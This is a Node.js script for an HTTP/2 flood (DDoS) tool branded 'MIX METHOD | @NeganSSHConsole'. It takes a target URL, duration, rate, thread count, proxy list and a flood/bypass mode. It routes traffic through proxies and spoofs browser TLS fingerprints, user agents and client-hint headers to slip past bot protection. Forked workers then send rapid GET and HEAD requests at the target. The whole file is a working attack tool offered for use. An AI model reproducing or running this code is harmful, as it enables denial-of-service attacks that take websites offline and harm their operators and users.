// npm install colors
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const scp = require("set-cookie-parser");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
var colors = require("colors");
const util = require('util');
const v8 = require("v8");


const statusesQ = []
let statuses = {}
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;



const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function getRandomTLSCiphersuite() {
  const tlsCiphersuites = [
    'TLS_AES_128_CCM_8_SHA256',
		'TLS_AES_128_CCM_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_AES_128_GCM_SHA256',
  ];

  const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];

  return randomCiphersuite;
}




const randomTLSCiphersuite = getRandomTLSCiphersuite();

const lookupPromise = util.promisify(dns.lookup);

let isp;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP', url + ':', isp);
        } else {
            return;
        }
    } catch (error) {
        return;
    }
}
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ],

  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ]
  const language_header = [
        "en-US,en;q=0.8",
        "en-US,en;q=0.5",
        "en-US,en;q=0.9",
        "en-US,en;q=0.7",
        "en-US,en;q=0.6",

        //Chinese
        "zh-CN,zh;q=0.8",
        "zh-CN,zh;q=0.5",
        "zh-CN,zh;q=0.9",
        "zh-CN,zh;q=0.7",
        "zh-CN,zh;q=0.6",

        //Spanish
        "es-ES,es;q=0.8",
        "es-ES,es;q=0.5",
        "es-ES,es;q=0.9",
        "es-ES,es;q=0.7",
        "es-ES,es;q=0.6",

        //French
        "fr-FR,fr;q=0.8",
        "fr-FR,fr;q=0.5",
        "fr-FR,fr;q=0.9",
        "fr-FR,fr;q=0.7",
        "fr-FR,fr;q=0.6",

        //German
        "de-DE,de;q=0.8",
        "de-DE,de;q=0.5",
        "de-DE,de;q=0.9",
        "de-DE,de;q=0.7",
        "de-DE,de;q=0.6",

        //Italian
        "it-IT,it;q=0.8",
        "it-IT,it;q=0.5",
        "it-IT,it;q=0.9",
        "it-IT,it;q=0.7",
        "it-IT,it;q=0.6",

        //Japanese
        "ja-JP,ja;q=0.8",
        "ja-JP,ja;q=0.5",
        "ja-JP,ja;q=0.9",
        "ja-JP,ja;q=0.7",
        "ja-JP,ja;q=0.6",

        //En + Russian
        "en-US,en;q=0.8,ru;q=0.6",
        "en-US,en;q=0.5,ru;q=0.3",
        "en-US,en;q=0.9,ru;q=0.7",
        "en-US,en;q=0.7,ru;q=0.5",
        "en-US,en;q=0.6,ru;q=0.4",

        //En + Chinese
        "en-US,en;q=0.8,zh-CN;q=0.6",

        //En + Spanish
        "en-US,en;q=0.8,es-ES;q=0.6",

        //En + French
        "en-US,en;q=0.8,fr-FR;q=0.6",

        //En + German
        "en-US,en;q=0.8,de-DE;q=0.6",
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];

process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
]
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions =
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_NO_TICKET |
crypto.constants.SSL_OP_NO_COMPRESSION |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_TLSEXT_PADDING |
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt flood/bypass`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6],
     input: process.argv[7],
     
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);







const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 1000;
colors.enable();
const coloredString = "Recommended big proxyfile if hard target.\n >  Only support HTTP/2.\n >  Use low thread(s) if you don't want crash your server.".white;
if (cluster.isMaster) {
    console.clear()
    console.log(`[!] MIX METHOD | @NeganSSHConsole`.red);
    console.log(`--------------------------------------------`.gray);
    console.log("[>] Heap Size:".green, (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString().yellow);
    console.log('[>] Target: '.yellow + process.argv[2].cyan);
    console.log('[>] Time: '.magenta + process.argv[3].cyan);
    console.log('[>] Rate: '.blue + process.argv[4].cyan);
    console.log('[>] Thread(s): '.red + process.argv[5].cyan);
    console.log(`[>] ProxyFile: ${args.proxyFile.cyan} | Total: ${proxies.length.toString().cyan}`);
    console.log('[>] Mode: '.green + process.argv[7].cyan);
    console.log("[>] Note: ".brightCyan + coloredString);
    console.log(`--------------------------------------------`.gray);
    getIPAndISP(targetURL);


    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads*2; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera"];
    
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};


     const browserVersion = getRandomInt(125,130);
    const fwfw = ['Google Chrome'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    let brandValue;
    if (browserVersion === 125) {
        brandValue = `"Not_A Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 126) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 127) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 128) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 129) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
  else if (browserVersion === 130) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }

    const userAgent = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;
   const userAgent1 = `Windows NT 10.0: Win64: x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
  const userAgent3 = `Mozilla/5.0 (iPhone; CPU iPhone OS 18_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile/15E148`;
 const userAgent5 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/129.0.2792.79`;
 const userAgent6 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/${browserVersion}.0.0.0`;
 const userAgent7 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.2352.52 Safari/537.36 Edg/${browserVersion}.0.527.106`;
 const userAgent9 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/${browserVersion}.0.4577.63 Safari/537.36`;
var valueofgod = 1;
                    var signature_0x1 = getRandomInt(82, 110);
                    var cookie;
                    var signature_0x2 = getRandomInt(80, 99);
                    var signature_0x3 = getRandomInt(70, 99);
                     
                     const mobiledd = getRandomInt(0, 1);
                    
                    var randUserAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36 OPR/${signature_0x2}.0.0.0`
    const secChUa = `${brandValue}`;
const u = [
userAgent,
userAgent1,
userAgent3,
userAgent5,
userAgent6,
userAgent7,
userAgent9,
randUserAgent,
];

function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }
 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);
  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    let interval
    	if (args.input === 'flood') {
	  interval = 1;
	} 
  else if (args.input === 'bypass') {
	  function randomDelay(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	  }
  

	  interval = randomDelay(5000, 10000);
	} else {
	  process.stdout.write('default : flood\r');
	  interval = 1;
	}
  
  
  encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ];

  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}

const uap = u[Math.floor(Math.random() * u.length)];
 
     const rateHeaders = [
  { "akamai-origin-hop": randstr(5) },
  { "proxy-client-ip": randstr(5) },
  { "via": randstr(5) },
  { "cluster-ip": randstr(5) },
        ];
        const rateHeaders2 = [
        { "dnt": "1"  },
        { "origin": "https://" + parsedTarget.host  },
        { "referer": "https://" + parsedTarget.host + "/" },
        {"accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
        ];
const method = [
"GET",
"HEAD",
];
let headers = {
  ":authority": parsedTarget.host,
  ":method": method[Math.floor(Math.random() * method.length)],
  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
  "Accept" : accept_header[Math.floor(Math.random() * accept_header.length)],
  ":path": parsedTarget.path,
  ":scheme": "https",
  "sec-ch-ua-platform" : randomElement(["Android","iOS", "Windows"]),
  "cache-control": "max-age=0",
  "sec-ch-ua" : secChUa,
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
"sec-fetch-user": "?1",
  "user-agent" :  uap,
   "x-requested-with": "XMLHttpRequest",
}
                    
 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     ":authority": parsedTarget.host,
     timeout: 150
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 15564991,
   };

    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: [
           "h2"
       ],
       ciphers: ciphers,
       sigalgs: sigalgs,
       socket: connection,
       ecdhCurve: ecdhCurve,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 600000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
         });


client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           for (let i = 0; i < args.Rate; i++) {
            const dynHeaders = {                 
              ...headers,    
              ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
              ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],    

              
            }
               const request = client.request(dynHeaders)
.on("response", response => {

                   request.close();
                   request.destroy();
                  return
               });
               request.end(); 

           }
       }, interval);
      return;
    });
    client.on("close", () => {
        client.destroy();
        connection.destroy();
        return
    });
client.on("timeout", () => {
	client.destroy();
	connection.destroy();
	return
	});
  client.on("error", (error) => {

    client.destroy();
    connection.destroy();
    return
});
});
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});